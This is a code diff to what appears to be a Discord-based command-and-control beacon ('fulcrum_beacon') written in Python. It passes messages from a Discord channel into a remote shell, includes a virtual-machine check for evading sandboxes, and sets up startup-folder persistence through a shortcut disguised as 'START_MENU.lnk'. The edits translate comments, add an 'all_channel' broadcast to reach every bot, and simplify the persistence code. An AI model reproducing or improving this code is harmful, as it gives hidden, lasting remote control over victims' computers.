@@ -37,12 +37,12 @@ intents = discord.Intents.default()
 intents.message_content = True
 intents.messages = True
 intents.guilds = True
-# bot client mit intents
+# bot client with intents
 client = discord.Client(intents=intents)
 
 
 @client.event
-async def on_ready():   # when the client connected to discord
+async def on_ready():   # called when the client connected to discord
     global first_execution
 
     print(f'logged in as {client.user}')
@@ -63,7 +63,7 @@ async def on_ready():   # when the client connected to discord
 
 
 @client.event
-async def on_message(message):  # when discord message was received
+async def on_message(message):  # called when discord message was received
     global mode
     # profile data laden
     profile_data = profile_manager.get_profile_data()
@@ -72,8 +72,9 @@ async def on_message(message):  # when discord message was received
     # searching for channel with the profiles channel name
     channel = discord.utils.get(client.get_all_channels(), name=profile_data["channel_name"])
 
-    # ignore messages send by beacon/client
-    if message.author == client.user or str(message.channel) != profile_data["channel_name"]:
+    # ignore messages not inside the correct channels and messages send by the beacon/client itself
+    if (message.author == client.user or str(message.channel) != profile_data["channel_name"]
+            and str(message.channel) != "all_channel"):
         return
 
     match mode:
@@ -132,6 +133,7 @@ async def on_message(message):  # when discord message was received
 
             # flush input to shell
             await shell_handler.flush_input(content)
+
 
 class FulcrumUtil:
     def check_for_vm(self):
@@ -238,12 +240,8 @@ class FulcrumUtil:
     def get_persistence(self):
         # using the windows startup folder
         try:
-            if os.path.isfile(os.path.join(INSTALL_PATH, "fulcrum_beacon.pyw")):
-                self._create_shortcut(os.path.join(START_FOLDER, "START_MENU.lnk"),
-                                os.path.join(INSTALL_PATH, "fulcrum_beacon.pyw"))
-            elif os.path.isfile(os.path.join(INSTALL_PATH, "fulcrum_beacon.exe")):
-                self._create_shortcut(os.path.join(START_FOLDER, "START_MENU.lnk"),
-                                os.path.join(INSTALL_PATH, "fulcrum_beacon.exe"))
+            self._create_shortcut(os.path.join(START_FOLDER, "START_MENU.lnk"),
+                                  os.path.join(INSTALL_PATH, os.path.basename(__file__)))
 
         except Exception as e:
             print(e)
